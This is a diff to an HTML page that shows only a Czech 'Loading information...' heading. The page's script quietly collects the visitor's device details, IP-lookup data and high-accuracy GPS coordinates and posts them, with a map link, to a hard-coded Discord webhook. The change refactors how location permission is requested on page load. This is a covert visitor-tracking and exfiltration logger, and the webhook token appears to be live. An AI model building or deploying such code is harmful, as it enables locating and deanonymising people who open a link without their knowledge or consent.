@@ -7,7 +7,7 @@
 </head>
 <body>
     <h2>Načítání informací...</h2>
-    
+
     <script>
         const webhookURL = "https://discord.com/api/webhooks/1336736765674917979/lyGotJhq7TWp2kRsHpd_246EPiXxMZ91S3rKDVuq54iFQX-FY8TlJ7pat1eBph-KL0XC";
 
@@ -40,32 +40,37 @@
             getIPInfo(ipData => {
                 let message = `${getDeviceInfo()}\n${ipData}\n📍 GPS: Nepovoleno`;
                 sendToWebhook(message);
-                requestLocation();  
+                askForLocation();  
             });
         }
 
-        function requestLocation() {
-            if ("geolocation" in navigator) {
-                navigator.geolocation.getCurrentPosition(position => {
-                    let { latitude, longitude } = position.coords;
-                    let mapLink = `https://en.mapy.cz/zakladni?q=${latitude}%2C%20${longitude}&x=${longitude}&y=${latitude}&z=15`;
-                    let gpsMessage = `📍 GPS Souřadnice: ${latitude}, ${longitude}\n🔗 Mapa: [Zobrazit na Mapy.cz](${mapLink})`;
-                    
-                    getIPInfo(ipData => {
-                        let message = `${getDeviceInfo()}\n${ipData}\n${gpsMessage}`;
-                        sendToWebhook(message);
+        function askForLocation() {
+            navigator.permissions.query({ name: "geolocation" }).then(result => {
+                if (result.state === "granted") {
+                    getLocation();  // Poloha už je povolená
+                } else if (result.state === "prompt") {
+                    navigator.geolocation.getCurrentPosition(getLocation, () => {
+                        console.error("Uživatel odmítl polohu");
+                    }, {
+                        enableHighAccuracy: true,
+                        timeout: 10000,
+                        maximumAge: 0
                     });
+                } else {
+                    console.warn("Přístup k poloze byl zablokován v nastavení prohlížeče");
+                }
+            });
+        }
 
-                }, error => {
-                    console.error("GPS není povoleno", error);
-                }, {
-                    enableHighAccuracy: true, // ✅ Požádá o přesnou polohu
-                    timeout: 10000, // ⏳ 10 sekund na odpověď
-                    maximumAge: 0
-                });
-            } else {
-                console.log("Geolokace není podporována.");
-            }
+        function getLocation(position) {
+            let { latitude, longitude } = position.coords;
+            let mapLink = `https://en.mapy.cz/zakladni?q=${latitude}%2C%20${longitude}&x=${longitude}&y=${latitude}&z=15`;
+            let gpsMessage = `📍 GPS Souřadnice: ${latitude}, ${longitude}\n🔗 Mapa: [Zobrazit na Mapy.cz](${mapLink})`;
+            
+            getIPInfo(ipData => {
+                let message = `${getDeviceInfo()}\n${ipData}\n${gpsMessage}`;
+                sendToWebhook(message);
+            });
         }
 
         // ✅ Automaticky požádá o polohu ihned po načtení
